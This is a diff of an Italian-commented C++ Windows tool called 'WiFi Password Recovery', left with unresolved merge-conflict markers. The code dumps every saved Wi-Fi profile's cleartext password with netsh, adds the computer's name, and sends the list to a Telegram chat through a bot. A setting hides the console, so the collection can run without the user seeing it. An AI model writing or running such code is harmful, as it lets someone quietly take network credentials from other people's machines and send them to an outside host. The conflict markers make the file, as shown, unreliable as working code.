@@ -1,12 +1,15 @@
 #include <iostream>
 #include <windows.h>
+<<<<<<< HEAD
+#include <Essentials.h> // Libreria per semplificare svariate funzioni
+#include <EssCurl.h> // Libreria per semplificare l'utilizzo di CURL
+#include "funzioni.h"
+=======
 #include <essentials.h> // Libreria per semplificare svariate funzioni
 #include <EssCurl.h> // Libreria per semplificare l'utilizzo di CURL, in questo caso verrà usata per il bot Telegram
+>>>>>>> bb46d5ff041b628039964d790c2c35ccf4107a62
 
 using namespace std;
-
-string GetChatID(TelegramBot&, Log&); // Prototipo della funzione per ottenere il ChatID
-void CheckUpdate(string, Log&); // Prototipo per controllare gli Update
 
 int main()
 {	
@@ -16,40 +19,49 @@ int main()
 	ConsoleUtils cu; // Classe di essentials per diverse utility sulla console di Windows
 	EasyMSGB msgb; // Classe di essentials per semplificare l'utilizzo dei MessageBox
 	Log lg("WPR.log", true); // Classe di essentials per gestire in maniera semplice un sistema di log
+	CLInterface cli; // Classe per la gestione dell'interfaccia a linea di console
+	TextColor tc;
+	LoadingBar lb;
 	
 	lg.RWFile(); // Sbianco il file di log
 	lg.WriteLog("Inizializzazione."); // Scrivo sul file di log
 	string ChatID;
 	string buffer;
-	string Versione="1.0.2"; // Versione locale del programma
+	string Versione="1.0.3"; // Versione locale del programma
 	bool Debug=false;
+<<<<<<< HEAD
+	VectString SSID; // Utilizzo i vettori per l'allocazione dinamica (e perch� sono belli :3)
+	VectString Password;
+=======
 	vector<string> SSID; // Utilizzo i vettori per l'allocazione dinamica (e perché sono belli :3)
 	vector<string> Password;
+>>>>>>> bb46d5ff041b628039964d790c2c35ccf4107a62
 	
 	cu.ConsoleTitle("WiFi Password Recovery ~ by Criper98"); // Cambio il titolo della finestra di console
 	tb.BotToken="123:ABC";
 	
-	if(sfs.CheckFile())
-		if(sfs.GetSetting("SetChatID") == "true") // Se "true" avvia la procedura per associare la chat a cui il bot deve mandare il messaggio
-		{
-			lg.WriteLog("ChatID non impostato, inizio procedura di associazione.");
-			
-			sfs.SetSetting("Chat_ID", GetChatID(tb, lg));
-			if(sfs.GetSetting("Chat_ID") == "-1") // Non succede, ma se succede...
-			{
-				lg.WriteLog("[Errore] - Associazione ChatID fallita.");
-				cout<<"Qualcosa e' andato storto durante l'associazione."<<endl;
-				Sleep(3000);
-				return 0;
-			}
-			sfs.SetSetting("SetChatID", "false");
-			lg.WriteLog("ChatID associato.");
-		}
-	else if(!sfs.CheckFile())
+	if(sfs.GetSetting("SetChatID") == "true") // Se "true" avvia la procedura per associare la chat a cui il bot deve mandare il messaggio
 	{
-		lg.WriteLog("[Errore] - Impossibile accedere al file \"settings.ini\".");
-		cout<<"Impossibile accedere al file \"settings.ini\"..."<<endl;
-		Sleep(3000);
+		lg.WriteLog("ChatID non impostato, inizio procedura di associazione.");
+		PrintTitle(Versione, 1);
+		cli.SubTitle("Associazione Chat Telegram", 75, tc.Green);
+		
+		cout<<"La chat per il bot Telegrma non e' associata."<<endl;
+		cout<<"Per associarla scrivere al bot @WiFiPRbot il seguente codice."<<endl;
+		
+		sfs.SetSetting("Chat_ID", GetChatID(tb, lg));
+		if(!VerificaChatID(sfs, lg))
+				return 0;
+		sfs.SetSetting("SetChatID", "false");
+		lg.WriteLog("ChatID associato.");
+	}
+	else if(sfs.GetSetting("SetChatID").find("Errore") != string::npos)
+	{
+		lg.WriteLog(sfs.GetSetting("SetChatID"));
+		tc.SetColor(tc.Red);
+		cout<<sfs.GetSetting("SetChatID")<<endl;
+		tc.SetColor(tc.Default);
+		system("pause");
 		return 0;
 	}
 	
@@ -59,12 +71,19 @@ int main()
 		CheckUpdate(Versione, lg);
 	if(sfs.GetSetting("HideConsole") == "true")
 		cu.HideConsole();
+	else
+		if(!EseguiInterfaccia(sfs, Versione, tb, lg))
+			return 0;
+	
+	cout<<"\nRecupero password in corso";
+	lb.DotsBar();
 	
 	ChatID=sfs.GetSetting("Chat_ID"); // Leggo l'ID della chat a cui mandare il messaggio Telegram
 	
 	if(gu.NoOutputCMD("ping api.telegram.org -n 1") != 0) // Controllo che le API siano raggiungibili
 	{
-		lg.WriteLog("[Errore] - Impossibile raggiungere le API di Telegram.");
+		lb.StopBar();
+		lg.WriteLog("[Errore]: Impossibile raggiungere le API di Telegram.");
 		msgb.Ok("Collegamento con le API di Telegram fallito.\nVerificare la connessione ad internet e riprovare.", msgb.Error, "WiFi Password Recovery");
 		return 0;
 	}
@@ -74,15 +93,15 @@ int main()
 	
 	if(buffer.find("Tutti i profili utente") == string::npos) // Se non ci sono profili:
 	{
+		lb.StopBar(100);
 		lg.WriteLog("Nessun profilo di rete wireless trovato.\n******************************\n"+buffer+"\n******************************");
-		tb.SendMessage(ChatID, "La postazione non ha una scheda wireless o non ha reti salvate...");
-		cout<<"La postazione non ha una scheda wireless o non ha reti salvate..."<<endl;
+		tb.SendMessage(ChatID, "La postazione "+gu.GetPCName()+" non ha una scheda wireless o non ha reti salvate...");
+		tc.SetColor(tc.Red);
+		cout<<"\nLa postazione non ha una scheda wireless o non ha reti salvate."<<endl;
+		tc.SetColor(tc.Default);
 		if(Debug)
-		{
 			cout<<buffer<<endl;
-			system("pause");
-		}
-		Sleep(3000);
+		system("pause");
 		return 0;
 	}
 	
@@ -96,7 +115,7 @@ int main()
 	
 	if(Debug)
 		for(int i=0; i<SSID.size(); i++)
-			cout<<SSID[i]<<endl;
+			cout<<"Profilo: "<<SSID[i]<<endl;
 	
 	lg.WriteLog("Aquisizione SSID e Password.");
 	for(int i=0; i<SSID.size(); i++) // Salvo su vettore la password e il vero nome dell'SSID della rete
@@ -105,11 +124,11 @@ int main()
 		
 		if(buffer.find("Contenuto chiave") == string::npos) // Se non c'è la password:
 		{
-			lg.WriteLog("Password non trovata per il profilo "+to_string(i));
+			lg.WriteLog("Password non trovata per il profilo "+SSID[i]);
 			Password.push_back("Password non trovata");
-			cout<<"Password non trovata per la rete "<<SSID[i]<<endl;
 			if(Debug)
 			{
+				cout<<"Password non trovata per la rete "<<SSID[i]<<endl;
 				cout<<gu.GetCMDOutput("netsh wlan show profile name=\""+SSID[i]+"\" key=clear")<<endl;
 				system("pause");
 			}
@@ -119,26 +138,29 @@ int main()
 		
 		SSID[i]=buffer.substr(buffer.find("Nome SSID")+32, buffer.find("\n", buffer.find("Nome SSID"))-33 - buffer.find("Nome SSID")); // Sovrascrivo il vero SSID della rete su vettore
 		if(Debug)
-			cout<<SSID[i]<<"----"<<endl;
+			cout<<"SSID: "<<SSID[i]<<endl<<"Password: "<<Password[i]<<endl;
 	}
-	lg.WriteLog("Aquisizione terminata.");
 	
 	lg.WriteLog("Creazione del Buffer.");
 	buffer.clear();
+	buffer="Elenco password recuperate dalla postazione "+gu.GetPCName()+"\n\n";
 	for(int i=0; i<SSID.size(); i++) // Creo il messaggio da mandare su Telegram
 		buffer+="SSID: "+SSID[i]+"\nPWD: "+Password[i]+"\n\n";
-	lg.WriteLog("Mando il Buffer alla chat "+ChatID);
+	lg.WriteLog("Invio Buffer alla chat "+ChatID);
 	tb.SendMessage(ChatID, buffer); // Mando il messaggio
 	
-	if(Debug)
-	{
-		for(int i=0; i<Password.size(); i++)
-			cout<<Password[i]<<endl;
+	lb.StopBar(100);
+	cout<<endl;
+	lg.WriteLog("Stampa password.");
+	StampaPassword(SSID, Password);
+	
+	if(sfs.GetSetting("HideConsole") == "false")
 		system("pause");
-	}
 	
 	return 0;
 }
+<<<<<<< HEAD
+=======
 
 void CheckUpdate(string Versione, Log& lg) // Funzione per controllare la presenza di Update
 {
@@ -188,3 +210,4 @@ string GetChatID(TelegramBot& tb, Log& lg) // Funzione per ottenere l'ID della c
 	
 	return "-1"; // Non succede, ma se succede...
 }
+>>>>>>> bb46d5ff041b628039964d790c2c35ccf4107a62
